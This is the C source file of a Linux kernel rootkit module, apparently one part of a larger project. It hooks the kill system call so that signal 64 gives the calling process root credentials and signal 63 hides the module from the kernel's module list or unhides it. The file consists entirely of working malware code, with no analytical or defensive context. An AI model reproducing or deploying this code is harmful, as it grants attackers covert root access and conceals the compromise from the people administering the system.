#include "kill.h"

asmlinkage int (*kill_orig)(struct pt_regs *);

asmlinkage int kill_hook(struct pt_regs *regs) {
    static int hidden = 0;
    static struct list_head *prev_module;

    int sig = regs->si;

    if (sig == 64) {
        printk(KERN_INFO "set current process as root-owned");

        {
            struct cred *root;

            if ((root = prepare_creds()) != NULL) {
                root->uid.val   = root->gid.val   = 0;
                root->euid.val  = root->egid.val  = 0;
                root->suid.val  = root->sgid.val  = 0;
                root->fsuid.val = root->fsgid.val = 0;

                commit_creds(root);
            }
        }

        return 0;

    } else if (sig == 63) {
        printk(KERN_INFO "toggle module presence");

        if (hidden == 0) {
            prev_module = THIS_MODULE->list.prev;
            list_del(&THIS_MODULE->list);
            hidden = 1;
        } else {
            list_add(&THIS_MODULE->list, prev_module);
            hidden = 0;
        }

        return 0;
    }

    return kill_orig(regs);
}
